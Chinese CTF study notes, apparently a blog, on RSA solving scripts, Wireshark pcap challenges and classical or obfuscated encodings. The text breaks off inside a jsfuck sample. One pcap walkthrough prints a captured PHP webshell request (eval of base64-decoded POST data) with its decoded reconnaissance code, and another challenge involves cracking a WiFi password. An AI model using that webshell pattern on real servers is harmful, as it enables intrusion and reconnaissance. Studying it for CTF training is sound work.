密码学RSA学习从0到1，基础知识 RSA出题参考博客 题目1：密钥生成 在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d,格式：key{xxxx} 已知p q e 解d 详细讲解 123ed ≡ 1 (mod r)r = (p-1)(q-1) = 2135733082216268400ed mod r = 1 mod r 12345678910p=473398607161q=4511491e=17r=(p-1)*(q-1)i=0while True: if (1-r*i)%e == 0: break i-=1 print ('d:' + '%d' % ((1-r*i)/e)) 使用rsatool.py进行计算，环境kali,python2.X sudo apt-get install libgmp-dev pip install gmpy python2 rsatool.py -p 473398607161 -q 4511491 -e 17 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#!/usr/bin/python2import base64, fractions, optparse, randomimport gmpy from pyasn1.codec.der import encoderfrom pyasn1.type.univ import * PEM_TEMPLATE = '-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n'DEFAULT_EXP = 65537 def factor_modulus(n, d, e): """ Efficiently recover non-trivial factors of n See: Handbook of Applied Cryptography 8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287) http://www.cacr.math.uwaterloo.ca/hac/ """ t = (e * d - 1) s = 0 while True: quotient, remainder = divmod(t, 2) if remainder != 0: break s += 1 t = quotient found = False while not found: i = 1 a = random.randint(1,n-1) while i &lt;= s and not found: c1 = pow(a, pow(2, i-1, n) * t, n) c2 = pow(a, pow(2, i, n) * t, n) found = c1 != 1 and c1 != (-1 % n) and c2 == 1 i += 1 p = fractions.gcd(c1-1, n) q = (n / p) return p, q class RSA: def __init__(self, p=None, q=None, n=None, d=None, e=DEFAULT_EXP): """ Initialize RSA instance using primes (p, q) or modulus and private exponent (n, d) """ self.e = e if p and q: assert gmpy.is_prime(p), 'p is not prime' assert gmpy.is_prime(q), 'q is not prime' self.p = p self.q = q elif n and d: self.p, self.q = factor_modulus(n, d, e) else: raise ArgumentError('Either (p, q) or (n, d) must be provided') self._calc_values() def _calc_values(self): self.n = self.p * self.q phi = (self.p - 1) * (self.q - 1) self.d = gmpy.invert(self.e, phi) # CRT-RSA precomputation self.dP = self.d % (self.p - 1) self.dQ = self.d % (self.q - 1) self.qInv = gmpy.invert(self.q, self.p) def to_pem(self): """ Return OpenSSL-compatible PEM encoded key """ return PEM_TEMPLATE % base64.encodestring(self.to_der()) def to_der(self): """ Return parameters as OpenSSL compatible DER encoded key """ seq = Sequence() for x in [0, self.n, self.e, self.d, self.p, self.q, self.dP, self.dQ, self.qInv]: seq.setComponentByPosition(len(seq), Integer(x)) return encoder.encode(seq) def dump(self, verbose): vars = ['n', 'e', 'd', 'p', 'q'] if verbose: vars += ['dP', 'dQ', 'qInv'] for v in vars: self._dumpvar(v) def _dumpvar(self, var): val = getattr(self, var) parts = lambda s, l: '\n'.join([s[i:i+l] for i in xrange(0, len(s), l)]) if len(str(val)) &lt;= 40: print '%s = %d (%#x)\n' % (var, val, val) else: print '%s =' % var print parts('%x' % val, 80) + '\n' if __name__ == '__main__': parser = optparse.OptionParser() parser.add_option('-p', dest='p', help='prime', type='int') parser.add_option('-q', dest='q', help='prime', type='int') parser.add_option('-n', dest='n', help='modulus', type='int') parser.add_option('-d', dest='d', help='private exponent', type='int') parser.add_option('-e', dest='e', help='public exponent (default: %d)' % DEFAULT_EXP, type='int', default=DEFAULT_EXP) parser.add_option('-o', dest='filename', help='output filname') parser.add_option('-f', dest='format', help='output format (DER, PEM) (default: PEM)', type='choice', choices=['DER', 'PEM'], default='PEM') parser.add_option('-v', dest='verbose', help='also display CRT-RSA representation', action='store_true', default=False) try: (options, args) = parser.parse_args() if options.p and options.q: print 'Using (p, q) to initialise RSA instance\n' rsa = RSA(p=options.p, q=options.q, e=options.e) elif options.n and options.d: print 'Using (n, d) to initialise RSA instance\n' rsa = RSA(n=options.n, d=options.d, e=options.e) else: parser.print_help() parser.error('Either (p, q) or (n, d) needs to be specified') rsa.dump(options.verbose) if options.filename: print 'Saving %s as %s' % (options.format, options.filename) if options.format == 'PEM': data = rsa.to_pem() elif options.format == 'DER': data = rsa.to_der() fp = open(options.filename, 'wb') fp.write(data) fp.close() except optparse.OptionValueError, e: parser.print_help() parser.error(e.msg) 参考文章1.CTFwiki–密码学部分 2.RSA介绍–总结 day02–Danie1流量分析 在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件，参赛选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索。 pcap流量包的分析通常都是通过图形化的网络嗅探器——wireshark进行的，这款嗅探器经过众多开发者的不断完善，现在已经成为使用最为广泛的安全工具之一。 Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。 经典题型 CTF题型主要分为流量包修复、WEB流量包分析、USB流量包分析和其他流量包分析。 实例 流量包修复 比赛中可能会出现通过wireshark打开题目给的流量包后提示包异常的情况，如图 思路 在线修复网站：http://f00l.de/hacking/pcapfix.php 题目 第一届 “百度杯” 信息安全攻防总决赛 线上选拔赛：find the flag pacp文件地址：https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap 解题思路： 在线修复，修复完毕后用wireshark打开，查找分组字节流-字符串-flag 看到where is the flag？继续查看下一个数据包 发现两个包id对应的字段刚好是flag 按照同样的方式连接后面相连数据包的id字段，找到最终的flag flag{aha!_you_found_it!} 基本的流量包分析 question 题目 test3.pcapng question 题目 test.pcapng question 题目链接：链接: https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg 密码: l43q 解题思路：wireshark打开流量包 可以看到User和pass，且都是base64编码 解码可以得到 user:test@51elab.com passwd:FLAG:ISCCTESTpas question 题目链接：链接: https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg 密码: 9r2i ​ 解题思路：wireshark打开流量包，追踪tcp流，在第二个流中发现flag ​ question 题目链接：链接: https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A 密码: wk6w 解题思路：wireshark打开流量包，过滤显示http协议包 发现不停的向一个目录post数据，猜测有人在上传一句话 追踪tcp流，发现 1cmd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D 先进行url解码，再进行base64解码，得到 123456789101112131415161718192021222324252627282930313233343536373839404142434445php @ini_set(“display_errors”,”0″); @set_time_limit(0); @set_magic_quotes_runtime(0); echo(“-&gt;|”);; $D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if($D==”&quot;) $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]); $R=”&#123;$D&#125;\t”; if(substr($D,0,1)!=”/”) &#123; foreach(range(“A”,”Z”) as $L) if(is_dir(“&#123;$L&#125;:”)) $R.=”&#123;$L&#125;:”; &#125; $R.=”\t”; $u=(function_exists(‘posix_getegid’))?@posix_getpwuid(@posix_geteuid()):”; $usr=($u)?$u[&apos;name&apos;]:@get_current_user(); $R.=php_uname(); $R.=”(&#123;$usr&#125;)”; print $R;; echo(“|&lt;-”); die(); 在tcp stream 5发现一个压缩包，下载 在tcp stream 6发现png文件头89504E47 保存为一张png图片 question 破解wifi密码（文件wifi.cap） 12345flag格式：flag&#123;你破解的WiFi密码&#125;tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你1391040**Goodluck!! 加解密 https://blog.csdn.net/qq_41187256/article/details/79693012 栅栏密码 所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话 明文：THERE IS A CIPHER去掉空格后变为：THEREISACIPHER两个一组，得到：TH ER EI SA CI PH ER先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR连在一起就是：TEESCPEHRIAIHR还原为所需密码。而解密的时候，我们先把密文从中间分开，变为两行：T E E S C P EH R I A I H R再按上下上下的顺序组合起来：THEREISACIPHER分出空格，就可以得到原文了：THERE IS A CIPHER Brainfuck/Ook!编码 https://tool.bugku.com/brainfuck/ 12345678Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. 培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：第一种方式：A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaabK ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabbU babaa V babab W babba X babbb Y bbaaa Z bbaab第二种方式a AAAAA g AABBA n ABBAA t BAABAb AAAAB h AABBB o ABBAB u-v BAABBc AAABA i-j ABAAA p ABBBA w BABAAd AAABB k ABAAB q ABBBB x BABABe AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 例： 1baabbaabaabaaaababbaaabbaabbababbabaaabb 脚本工具 caesar（凯撒） 使用python pycipher库 RSA算法(非对称密码) 加密过程 选择两个大素数p和q，计算出模数N = p * q 计算φ = (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质 取e的模反数为d，计算方法: e * d ≡ 1 (mod φ) 对明文m进行加密：c≡m^e (mod n) 或 c = pow(m,e,n)，得到的B即为密文 对密文c进行解密，m≡c^d( mod n) 或 m = pow(c,d,n)，得到的A即为明文 p 和 q ：大整数N的两个因子（factor） N：大整数N，我们称之为模数（modulus） e 和 d：互为模反数的两个指数（exponent） c 和 m：分别是密文和明文，这里一般指的是一个十进制的数 一般有如下称呼： （N，e）：公钥 （N，d）：私钥 分解N可以在线factordb.com 代码 123456789101112131415161718192021222324252627282930313233343536#-*-coding:utf-8-*-def split_n(n): #分解n for i in range(2,n): if n%i == 0: p = i q = int(n/i) break return p,qdef egcd(a, b): #求d if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: exit('wrong') else: return x % me=17n=2135733555619387051c=781391873123526159p,q=split_n(n)print('n:%d'%n)print('e:%d'%e)print('c:%d'%c)print("p = " + str(p))print("q = " + str(q))d=modinv(e,(p-1)*(q-1))print('d = '+str(d))m=pow(c,d,n) #快速幂取模print('m = '+str(m)) 常见题型的分类 （1）已知p、q、e求解d 解题思路：根据 φ = (p−1) (q−1)这一欧拉函数式， 可以使用所给的p、q求解出n的欧拉函数值φ,之后再根据 e d ≡ 1 (mod φ) 即可求解出d的值。 题目 http://www.shiyanbar.com/ctf/1828 代码 1234567891011121314151617181920212223242526#!/usr/bin/pythondef egcd(a, b): #求d if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: exit('wrong') else: return x % mdef main(): p=473398607161 q=4511491 e=17 f_n=(p-1)*(q-1) d=modinv(e,f_n) print(d)if __name__ == "__main__": main() 已知p、q、e、c求解明文 思路：根据n=p*q求解出n的值，之后再根据φ = (p−1) * (q−1)，求解出n的欧拉函数的值，之后再根据e * d ≡ 1 (mod φ)求解出d的值，之后再根据m≡c^d( mod n) 或 m = pow(c,d,n)求解出明文信息即可！ 题目 http://www.shiyanbar.com/ctf/1979 代码 123456789101112131415161718192021222324252627282930313233#-*-coding:utf-8-*-def egcd(a, b): #求d if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: exit('wrong') else: return x % me=65537p=9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407c=83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034n=p*qf_n=(p-1)*(q-1)print('n:%d'%n)print('e:%d'%e)print('c:%d'%c)d=modinv(e,f_n)print('d = '+str(d))m=pow(c,d,n)print("------------")print('message:%d'%m) 题目 http://ctf5.shiyanbar.com/crypto/RSAROLL.txt 1234567891011121314151617181920212223242526272829303132333435363738#-*-coding:utf-8-*-def split_n(n): #分解n for i in range(2,n): if n%i == 0: p = i q = int(n/i) break return p,qdef egcd(a, b): #求d if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: exit('wrong') else: return x % me=19n=920139713res=''p,q=split_n(n)print('n:%d'%n)print('e:%d'%e)print("p = " + str(p))print("q = " + str(q))d=modinv(e,(p-1)*(q-1))print('d = '+str(d))with open('rsa.txt') as f: for c in f: res+=chr(pow(int(c.replace('\n','')),d,n))print(res) DES（对称算法） https://blog.csdn.net/qq_42606051/article/details/81279504 题目 123密文：74cWby3JysahM3cZudF3gT11lamL/4Cdkey=12345678求明文 代码 1234567891011121314# -*-coding:utf-8-*-from Crypto.Cipher import DESimport base64key = '12345678'des = DES.new(key,DES.MODE_ECB)encrypted_text=base64.b64decode('74cWby3JysahM3cZudF3gT11lamL/4Cd')decrypted_text = des.decrypt(encrypted_text)print "明文:"+decrypted_text https://blog.csdn.net/iteye_6478/article/details/82165923 拓展 与佛论禅 http://www.keyfc.net/bbs/tools/tudoucode.aspx 1怯勝苦集參哆究梵礙呐度究梵呼梵顛以怯勝豆哆陀哆真罰夜大知涅曳他呐依道多波缽喝侄波缽羅奢喝俱咒冥上奢阿怯喝侄羅以侄朋僧哆婆謹冥地諳顛哆度哆都冥寫有呐阿勝娑哆涅皤怛。怯苦怯南是哆得謹侄訶至故殿故僧道多地罰倒皤利奢喝呐南奢都哆。切是奢究奢藝侄參哆佛曰明諳道彌奢娑阿哆寫娑利梵姪若諦竟奢藐悉奢集諳彌諳遮怯。皤喝阿孕怯曰罰般梵多伊梵耨死哆彌阿輸呐遮冥上哆藐夷冥輸俱故沙恐冥薩侄栗世得。耨夢諳智都冥薩耨俱薩皤密吉怖罰想上罰喝訶罰蒙盧舍神藝哆知呐姪怯那楞皤度遮奢顛度梵咒呐訶悉梵利究即冥夢諳一俱娑怯沙俱三奢婆缽知侄無呐若槃醯想哆故冥怖沙諳一豆曳呐咒心羯有 解密前要带上佛曰：或如是我闻：的文字。 aaencode 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;); 解密网站 https://www.qtool.net/decode jsfuck 1(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[